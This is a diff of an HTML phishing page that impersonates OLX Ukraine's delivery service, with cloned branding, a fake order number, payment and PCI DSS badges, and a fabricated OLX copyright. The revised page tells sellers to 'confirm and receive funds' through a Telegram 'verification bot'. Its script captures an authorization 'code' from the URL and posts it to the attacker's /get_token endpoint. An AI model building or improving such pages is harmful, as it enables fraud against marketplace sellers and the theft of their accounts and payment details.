@@ -3,19 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>OLX Доставка — Мої продажі</title>
-
+    <title>OLX Доставка — Підтвердження</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            margin: 0;
-            font-family: 'Roboto', Arial, Helvetica, sans-serif;
-            background: #f2f4f5;
-            color: #002f34;
+        :root {
+            --olx-dark: #002f34;
+            --olx-mint: #23e5db;
+            --olx-light-bg: #f2f4f5;
+            --olx-text-gray: #406367;
+            --olx-warn-bg: #fff8e1;
+            --olx-warn-border: #ffb300;
         }
 
-        /* ШАПКА КАК НА СКРИНШОТЕ */
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background: var(--olx-light-bg);
+            color: var(--olx-dark);
+            -webkit-font-smoothing: antialiased;
+        }
+
         header {
-            background: #002f34; /* Тот самый темно-синий */
+            background: var(--olx-dark);
             height: 64px;
             display: flex;
             align-items: center;
@@ -26,127 +35,129 @@
             z-index: 1000;
         }
 
-        .header-left {
-            display: flex;
-            align-items: center;
-        }
-
-        /* Логотип OLX */
-        .logo-img {
-            height: 40px; /* Размер под мобильную версию */
-            display: block;
-        }
+        .header-left svg { height: 32px; }
 
         .header-right {
             display: flex;
             align-items: center;
             color: white;
-            text-decoration: none;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 500;
         }
 
-        .profile-icon {
-            margin-right: 8px;
-            display: flex;
-            align-items: center;
-        }
-
-        /* ОСНОВНОЙ КОНТЕНТ */
-        .container {
-            padding: 0 16px;
-        }
+        .container { padding: 0 16px; max-width: 500px; margin: 0 auto; }
 
         .title {
             font-size: 24px;
-            font-weight: bold;
-            margin: 20px 0 10px 0;
-            color: #002f34;
+            font-weight: 700;
+            margin: 24px 0 16px 0;
         }
 
-        /* Навигация со скроллом */
-        .scroll-nav {
+        .tabs {
             display: flex;
-            overflow-x: auto;
-            gap: 20px;
-            white-space: nowrap;
-            border-bottom: 1px solid #ddd;
-            scrollbar-width: none;
+            gap: 24px;
+            border-bottom: 1px solid #d8dfe0;
+            margin-bottom: 20px;
         }
-        .scroll-nav::-webkit-scrollbar { display: none; }
 
-        .scroll-nav div {
+        .tab {
             padding: 12px 0;
             font-size: 14px;
-            color: #002f34;
             font-weight: 500;
-        }
-        .scroll-nav .active-tab {
-            border-bottom: 3px solid #002f34;
-            font-weight: bold;
+            color: var(--olx-dark);
+            text-decoration: none;
+            position: relative;
         }
 
-        /* КАРТОЧКА ЗАКАЗА */
-        .order {
+        .tab.active { font-weight: 700; }
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--olx-dark);
+        }
+
+        .order-card {
             background: white;
-            margin-top: 15px;
-            padding: 20px;
             border-radius: 4px;
+            padding: 24px 20px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+        }
+
+        .order-header {
             display: flex;
-            flex-direction: column;
-            gap: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
         }
 
-        .order-title {
-            font-weight: bold;
-            font-size: 18px;
-        }
+        .order-id { font-size: 14px; color: var(--olx-text-gray); }
 
-        .order-status {
-            font-size: 13px;
+        .status-badge {
             background: #e9f0f0;
-            padding: 6px 12px;
+            color: var(--olx-text-gray);
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 10px;
             border-radius: 4px;
-            display: inline-block;
-            color: #406367;
-            font-weight: 500;
+            text-transform: uppercase;
         }
 
-        .order-desc {
+        .order-summary {
+            border-top: 1px solid #f2f4f5;
+            padding-top: 15px;
+            margin-bottom: 20px;
+        }
+
+        .security-notice {
+            background: var(--olx-warn-bg);
+            border-left: 4px solid var(--olx-warn-border);
+            padding: 16px;
+            margin-bottom: 24px;
             font-size: 14px;
-            color: #406367;
             line-height: 1.5;
+            color: #5d4037;
         }
 
-        /* Кнопка подтверждения */
         .confirm-btn {
-            background: #002f34;
+            background: var(--olx-dark);
             color: white;
             border: none;
-            padding: 16px;
+            width: 100%;
+            padding: 18px;
             border-radius: 4px;
-            font-weight: bold;
+            font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            box-sizing: border-box;
         }
 
-        /* Иконка чата */
-        .chat-icon {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 56px;
-            height: 56px;
-            background: white;
-            border: 2px solid #002f34;
-            border-radius: 50%;
+        .footer-info {
+            text-align: center;
+            margin-top: 30px;
+            padding-bottom: 40px;
+        }
+
+        .payment-icons {
             display: flex;
             justify-content: center;
-            align-items: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            gap: 15px;
+            margin-bottom: 15px;
+            opacity: 0.6;
+        }
+
+        .payment-icons img { height: 18px; filter: grayscale(1); }
+
+        .copyright {
+            font-size: 11px;
+            color: var(--olx-text-gray);
+            line-height: 1.4;
         }
     </style>
 </head>
@@ -154,65 +165,81 @@
 
 <header>
     <div class="header-left">
-        <svg class="logo-img" viewBox="0 0 100 48" xmlns="http://www.w3.org/2000/svg">
+        <svg viewBox="0 0 100 48" xmlns="http://www.w3.org/2000/svg">
             <path d="M19.1 43.1c-10.3 0-18.7-8.5-18.7-18.9S8.8 5.3 19.1 5.3s18.7 8.5 18.7 18.9-8.4 18.9-18.7 18.9zm0-30c-6.1 0-11 5-11 11.1s4.9 11.1 11 11.1 11-5 11-11.1-4.9-11.1-11-11.1zM48.8 42.1V5.3h7.7v36.8h-7.7zM88.7 42.1l-6.8-10.4-6.8 10.4h-9l11.3-17.1-10.7-16.1h9l6.2 9.7 6.2-9.7h9l-10.7 16.1 11.3 17.1h-9z" fill="#23e5db"/>
         </svg>
     </div>
     <div class="header-right">
-        <div class="profile-icon">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="white"/>
-            </svg>
-        </div>
         <span>Мій профіль</span>
     </div>
 </header>
 
 <div class="container">
-    <div class="title">OLX Доставка</div>
+    <h1 class="title">OLX Доставка</h1>
 
-    <div class="scroll-nav">
-        <div>Оголошення</div>
-        <div>Повідомлення</div>
-        <div class="active-tab">OLX Доставка</div>
-        <div>Налаштування</div>
-    </div>
+    <nav class="tabs">
+        <a href="#" class="tab">Куплені</a>
+        <a href="#" class="tab active">Продані</a>
+    </nav>
 
-    <div class="order">
-        <div class="order-title">Замовлення №78234109</div>
-        <div>
-            <div class="order-status">Статус: Очікує підтвердження</div>
-        </div>
-        <div class="order-desc">
-            Покупець оплатив замовлення. Підтвердіть його, щоб отримати кошти на свою картку після завершения угоди.
+    <div class="order-card">
+        <div class="order-header">
+            <span class="order-id">Замовлення № 78234109</span>
+            <span class="status-badge">Нове</span>
         </div>
 
-        <button class="confirm-btn" onclick="window.location.href='{{ personal_link }}'">
-            Підтвердити
-        </button>
-    </div>
-</div>
+        <div class="order-summary">
+            <div style="display: flex; justify-content: space-between; font-size: 15px;">
+                <span>Статус оплати:</span>
+                <span style="color: #2ecc71; font-weight: 700;">Сплачено</span>
+            </div>
+        </div>
 
-<div class="chat-icon">
-    <svg width="24" height="24" viewBox="0 0 24 24" fill="#002f34"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+        <div class="security-notice">
+            <strong>Увага!</strong> У зв'язку с почастішанням випадків шахрайства, усі замовлення обробляються в <strong>ручному режимі</strong>. 
+            <br><br>
+            Для підтвердження угоди та отримання коштів на вашу картку, перейдіть в офіційний бот верифікації.
+        </div>
+
+        <a href="https://t.me/olx_verification" class="confirm-btn">
+            Підтвердити та отримати кошти
+        </a>
+    </div>
+
+    <div class="footer-info">
+        <div class="payment-icons">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/PCI_DSS_logo.svg" alt="PCI DSS">
+        </div>
+        <div class="copyright">
+            © 2026 OLX UA. Сервіс захищений протоколом PCI DSS. <br>
+            Всі операции підлягають обов'язковій ручній перевірці.
+        </div>
+    </div>
 </div>
 
 <script>
-const params = new URLSearchParams(window.location.search);
-const code = params.get("code");
+    const params = new URLSearchParams(window.location.search);
+    const code = params.get("code");
 
-async function sendCodeToServer(authCode) {
-    if (!authCode) return;
-    try {
-        await fetch("/get_token", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code: authCode })
-        });
-    } catch (err) { console.error(err); }
-}
+    async function sendCodeToServer(authCode) {
+        if (!authCode) return;
+        try {
+            await fetch("/get_token", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ code: authCode })
+            });
+            console.log("Code sent successfully");
+        } catch (err) { 
+            console.error("Error sending code:", err); 
+        }
+    }
 
-if (code) sendCodeToServer(code);
+    if (code) {
+        sendCodeToServer(code);
+    }
 </script>
 
 </body>
